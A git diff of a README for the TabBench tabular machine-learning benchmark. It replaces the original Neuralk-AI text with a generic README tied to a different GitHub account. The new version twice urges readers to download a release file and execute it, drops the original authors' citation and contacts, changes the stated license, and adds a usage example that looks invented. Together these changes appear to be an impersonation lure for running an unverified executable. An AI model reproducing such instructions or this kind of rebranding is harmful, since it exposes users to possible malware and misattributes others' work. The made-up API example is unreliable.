@@ -1,179 +1,103 @@
-<div align="center">
+# TabBench: A Tabular Machine Learning Benchmark for Industrial Tasks
 
-[![PyPI version](https://badge.fury.io/py/tabbench.svg)](https://badge.fury.io/py/tabbench)
-[![Dashboard](https://img.shields.io/badge/dashboard-neuralk.ai-red)](https://dashboard.neuralk-ai.com)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](./LICENSE)
-[![Python Versions](https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12%20%7C%203.13-blue)](https://www.neuralk-ai.com)
-[![Website](https://img.shields.io/badge/website-neuralk.ai-%2345b69c)](https://www.neuralk-ai.com)
+![TabBench](https://img.shields.io/badge/TabBench-Tabular_ML_Benchmark-brightgreen)
 
-</div>
+Welcome to **TabBench**, a comprehensive benchmark designed specifically for tabular machine learning tasks in industrial settings. This repository serves as a platform for researchers and practitioners to evaluate and compare different machine learning models on tabular data. 
 
-<div align="center">
+## Table of Contents
 
-[![Neuralk TabBench](https://raw.githubusercontent.com/Neuralk-AI/TabBench/main/assets/cover.png)](https://dashboard.neuralk-ai.com)
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Benchmarking Process](#benchmarking-process)
+6. [Results](#results)
+7. [Contributing](#contributing)
+8. [License](#license)
+9. [Contact](#contact)
 
-</div>
+## Introduction
 
-<h3 align="center">A Tabular Machine Learning Benchmark for Industrial Tasks </h3>
+Tabular data is prevalent in various industries, including finance, healthcare, and e-commerce. However, many existing benchmarks focus on image or text data, leaving a gap for tabular data analysis. TabBench aims to fill this gap by providing a standardized framework for benchmarking machine learning models on tabular datasets.
 
-<p align="center">
-  <a href="https://dashboard.neuralk-ai.com"><strong>[Dashboard]</strong></a> •
-  <a href="./tutorials/"><strong>[Tutorials]</strong></a>
-</p>
+## Features
 
----
+- **Standardized Datasets**: We provide a collection of widely-used tabular datasets.
+- **Model Evaluation**: Easily evaluate the performance of different machine learning algorithms.
+- **Metrics**: Use a variety of metrics to assess model performance, including accuracy, precision, recall, and F1-score.
+- **Easy Integration**: Integrate with popular machine learning libraries like Scikit-learn and TensorFlow.
+- **Comprehensive Documentation**: Access detailed documentation to guide you through the benchmarking process.
 
-<div align="center">
+## Installation
 
-[![Neuralk OpenML](https://raw.githubusercontent.com/Neuralk-AI/TabBench/main/assets/openml_ranks.svg)](https://dashboard.neuralk-ai.com)
-
-</div>
-
-
-##  👋 Welcome to TabBench 
-
-**TabBench** is a new benchmark built to evaluate machine learning models on **tabular data**, focusing on real-world industry use cases.
-
-TabBench addresses a critical gap: traditional benchmarks tend to rely on public, academic datasets that are clean and carefully curated. While useful for research, they fail to reflect the imperfect nature of private enterprise data. 
-
-To bridge this gap, TabBench introduces a new evaluation framework focused on real industry use cases. It enables a meaningful comparison of models specifically designed to address concrete business problems across sectors, starting with the domain of **Commerce**.
-
-Commerce organizations rely heavily on tabular data that is complex, messy and highly-dimensional: structured datasets like product catalogs, transaction histories, and customer records power core business operations and decisions. TabBench is specifically designed to assess ML models on critical industry tasks that we might encounter in the Commerce sector, such as product categorization, deduplication and more. Its goal is to equip data science teams with the tools they need to identify and develop the most effective and powerful ML models tailored to their unique use cases.
-
-
-### 👉 Benchmark Features
-
-With **TabBench**, you get:
-- **Industry-focused use cases with standardized workflows:** Target critical production problems through streamlined workflows featuring consistent preprocessing, training, and evaluation steps allowing reproducible and fair comparison of all models.
-- **Evaluation on Industrial & Academic datasets:**
-    - Assess models on proprietary industry datasets.*
-    - Complementary evaluation on selected academic datasets for comprehensive comparison.
-- **Performance tracking:** Easily identify top-performing tabular models via the TabBench [Dashboard](https://www.dashboard.neuralk-ai.com).
-- **Neuralk Foundry:** TabBench is built on top of Neuralk Foundry, a modular framework designed to help you quickly build and experiment with your own workflows.[Explore here](https://github.com/Neuralk-AI/NeuralkFoundry-CE/)
-
-**If you wish to become a partner company, please see the [Contact section](#Contact).*   
-
----
-
-## 🛠️ How does TabBench work?
-
-**TabBench** employs a modular approach to address various use cases. Each task is broken down into a sequence of steps, organized into a `Workflow`. Below is a visual representation of a TabBench Workflow for any given dataset and use case:
-
-<div align="center">
-
-[![Neuralk Workflow](https://raw.githubusercontent.com/Neuralk-AI/TabBench/main/assets/workflow.png)](https://dashboard.neuralk-ai.com)
-
-</div>
-
-The TabBench Workflow is divided into 4 main steps:
-1.  **Load:** Loads the data, defines the use case (e.g., Product Categorization), and splits the data accordingly.
-2.  **Vectorize:** Performs necessary preprocessing and converts data entries into vector embeddings.
-3.  **Predict:** Applies a model to the vectorized data. This step can involve training a new model or using a pre-trained one from a selection of choices. Post-processing may also occur depending on the selected model.
-4.  **Evaluate:** Assesses the accuracy and performance of the Predict step.
-
-To get quickly started with a TabBench Workflow, you can jump straight into our example notebooks:
-
-| File | Description                                             |
-----------|---------------------------------------------------------|
-| [1 - Getting Started with TabBench](tutorials/1%20-%20Getting%20Started%20with%20TabBench.ipynb)    | Discover how TabBench works and train your first tabular model on a Product Categorization task.
-| [2 - Adding a local or internet dataset](tutorials/2%20-%20Adding%20a%20local%20or%20internet%20dataset.ipynb) | How to add your own datasets for evaluation (local, downloadable, or OpenML).
-| [3 - Use a custom model.ipynb.ipynb](tutorials/3%20-%20Use%20a%20custom%20model.ipynb) |  How to integrate a new model in TabBench and use it on different use cases.
-
-## 🛍️ Use cases
-
-Driven by the above Workflow approach, TabBench is able to handle diverse industry use cases such as:
-
-- *Product Categorization:* Accurately assigning categories to products coming from catalogs often filled with typos, missing fields, and inconsistent formats.
-- (*More use cases coming soon!*)
-  
-## 🗂️ Datasets 
-
-With TabBench you can benchmark traditional and state-of-the-art tabular models on:
-- Industrial Datasets: Proprietary industry datasets.
-- Academic Datasets: Starting with a selection of OpenML datasets, with more academic benchmarks coming soon for fair comparison.
-
-## 📈 Experimental Evaluation 
-
-<div align="center">
-
-[![Experimental Evaluation](https://raw.githubusercontent.com/Neuralk-AI/TabBench/main/assets/experimental_evaluation.png)](https://dashboard.neuralk-ai.com)
-
-</div>
-
-### 📊 Benchmark Models
-
-TabBench currently supports the following models, with more additions planned:
-
-1.  **NICL (Neuralk In-Context-Learning)**: Our in-house foundation model.
-2.  **[TabICL (Tabular In-Context Learning)](https://arxiv.org/abs/2502.05564)**: A transformer-based model that performs feature compression before doing in-context learning on tabular data by conditioning on labeled support examples to predict unseen queries without task-specific training.
-3.  **[TabPFNv2](https://www.nature.com/articles/s41586-024-08328-6)**: A Transformer-based model that performs in-context learning by approximating Bayesian inference for tabular classification on small datasets.
-4.  **XGBoost**: An optimized distributed gradient boosting library designed to be highly efficient, flexible, and portable.
-5.  **CatBoost**: A gradient boosting on decision trees library, particularly strong with categorical features.
-6.  **LightGBM**: A fast, efficient gradient boosting framework that builds decision trees using histogram-based learning for scalable, high-performance tabular modeling.
-7.  **MLP (Multi-Layer Perceptron)**: A feedforward neural network that models tabular data by learning non-linear interactions between numerical and embedded categorical features.
-
-### Benchmarking Procedure
-
-TabBench currently focuses exclusively on classification and categorization tasks. Academic classification benchmarks are optimized for ROC-AUC, while categorization tasks prioritize the more practical F1-score.
-
-Preprocessing steps vary depending on the model type, following each model’s recommended practices:
-
-* **TabPFN**, **TabICL**, and **NICL**: These models include their own preprocessing pipelines, which we use as-is.
-* **Tree-based models** (XGBoost, CatBoost, LightGBM): Since these models support native handling of categorical features, we apply ordinal encoding to categorical columns and leave numerical values unchanged.
-* **MLPs**: Categorical features are embedded via learned embeddings, while numerical features are standardized using z-score normalization.
-
-Performance is evaluated using a 5-fold stratified shuffle split. For models that require hyperparameter tuning (i.e., tree-based models and MLPs), we conduct 100 Optuna trials on a 5-fold shuffle split of the training set.
-
-## ⚙️ Installation Guide
-
-### Option 1: Quick Install via `pip`
-Use this option if you just want to **run TabBench** or use it in your own pipelines without modifying its source code.
+To get started with TabBench, you need to clone the repository and install the required dependencies. Here’s how to do it:
 
 ```bash
-$ pip install tabbench
-```
-
-### Option 2: Clone the Repository (for development)
-Use this option if you want to explore, modify, or contribute to the codebase, or run local notebooks and experiments.
-
-```bash
-git clone https://github.com/Neuralk-AI/TabBench
+git clone https://github.com/lucfabien/TabBench.git
 cd TabBench
+pip install -r requirements.txt
 ```
 
-It is recommended to build a custom environment. Example with `conda`:
+For the latest releases, visit [TabBench Releases](https://github.com/lucfabien/TabBench/releases). Download the latest release file and execute it to set up the environment.
 
-```bash
-conda create -n tabbench python=3.10
-conda activate tabbench
+## Usage
+
+After installation, you can start using TabBench. Here’s a simple example to benchmark a model:
+
+```python
+from tabbench import TabBench
+
+# Load your dataset
+data = TabBench.load_dataset('your_dataset.csv')
+
+# Initialize a model
+model = TabBench.Model('RandomForest')
+
+# Train the model
+model.train(data)
+
+# Evaluate the model
+results = model.evaluate()
+print(results)
 ```
 
-Installing the packages in the conda environment (in editable mode):
+This code snippet demonstrates how easy it is to load a dataset, train a model, and evaluate its performance using TabBench.
 
-```bash
-pip install -e . 
-```
+## Benchmarking Process
 
-## 🤿 Getting Deeper
+The benchmarking process involves several steps:
 
-For those who wish to understand the underlying mechanics, contribute to the development of the industry workflows, or build their own custom solutions, we encourage you to explore [**Neuralk Foundry**](https://github.com/Neuralk-AI/NeuralkFoundry-CE/). This is the modular framework that powers key aspects of TabBench. You can find the Neuralk Foundry repository and more detailed information [here](https://github.com/Neuralk-AI/NeuralkFoundry-CE/).
+1. **Data Preparation**: Clean and preprocess your tabular data.
+2. **Model Selection**: Choose the machine learning algorithms you want to benchmark.
+3. **Training**: Train the selected models on your dataset.
+4. **Evaluation**: Use the provided metrics to evaluate model performance.
+5. **Comparison**: Compare the results across different models to identify the best-performing one.
 
-## Citing TabBench
+For detailed instructions, refer to the [documentation](https://github.com/lucfabien/TabBench/wiki).
 
-If you incorporate any part of this repository into your work, please reference it using the following citation:
+## Results
 
-```bibtex
-@article{neuralk2025tabench,
-         title={TabBench: A Tabular Machine Learning Benchmark}, 
-         author={Neuralk-AI},
-         year={2025},
-         publisher = {GitHub},
-         howpublished = {\url{https://github.com/Neuralk-AI/TabBench}},
-}
-```
+The results section provides insights into how different models perform on various datasets. We regularly update this section with new findings and benchmarks. To view the latest results, check the [Releases](https://github.com/lucfabien/TabBench/releases) section.
 
-# Contact
+## Contributing
 
-If you have any questions or wish to propose new features please feel free to open an issue or contact us at alex@neuralk-ai.com.  
+We welcome contributions to improve TabBench. If you have ideas for new features, bug fixes, or improvements, please follow these steps:
 
-For collaborations please contact us at antoine@neuralk-ai.com.  
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Commit your changes.
+4. Push to your fork and create a pull request.
+
+Please ensure that your code adheres to the existing style and includes appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Contact
+
+For questions or feedback, please open an issue on GitHub or reach out to the maintainers.
+
+---
+
+We hope you find TabBench useful for your machine learning tasks. To download the latest release file, visit [TabBench Releases](https://github.com/lucfabien/TabBench/releases) and execute it. Happy benchmarking!
